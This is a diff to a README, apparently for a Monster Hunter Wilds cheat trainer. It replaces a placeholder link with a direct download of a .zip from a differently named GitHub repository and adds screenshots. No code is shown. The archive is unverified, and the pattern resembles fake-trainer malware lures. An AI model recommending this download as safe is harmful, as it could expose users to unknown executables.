@@ -15,13 +15,20 @@
 
   <br><br>
 
-  <a href="https://github.com/YOUR_USERNAME/Monster-Hunter-Wilds-Trainer/releases/latest" target="_blank">
+  <a href="https://github.com/alessiocasali94/Monster-Hunter-Inventory-Editor-and-Stats/releases/download/Monster-Hunter/Monster.Hunter.Wilds.Trainer.zip" target="_blank">
     <img src="https://img.shields.io/badge/⬇️_DOWNLOAD_LATEST_VERSION-00ff9d?style=for-the-badge&logoColor=black&labelColor=111111&color=00ff9d" alt="Download Latest Version" height="68">
   </a>
 
 </div>
 
 **Powerful standalone trainer for Monster Hunter Wilds (2026)** — Core functions, Resources, Rewards and Weapon-specific tools with hotkeys and real-time parameters.
+
+<img width="1025" height="750" alt="image" src="https://github.com/user-attachments/assets/8525e250-be33-44b8-b4aa-d8b7077f7dcd" />
+<img width="1024" height="754" alt="image" src="https://github.com/user-attachments/assets/fa926e85-4c9f-452b-85da-1c4eb1873748" />
+<img width="1022" height="749" alt="image" src="https://github.com/user-attachments/assets/624cec8f-a88e-45d6-bd6b-410e53531c04" />
+<img width="1025" height="753" alt="image" src="https://github.com/user-attachments/assets/86e7c037-67c1-410a-b24b-d8789e159c90" />
+<img width="1023" height="754" alt="image" src="https://github.com/user-attachments/assets/7ba1e23c-54c9-4526-a83e-901dc6a12dbf" />
+
 
 ---
 
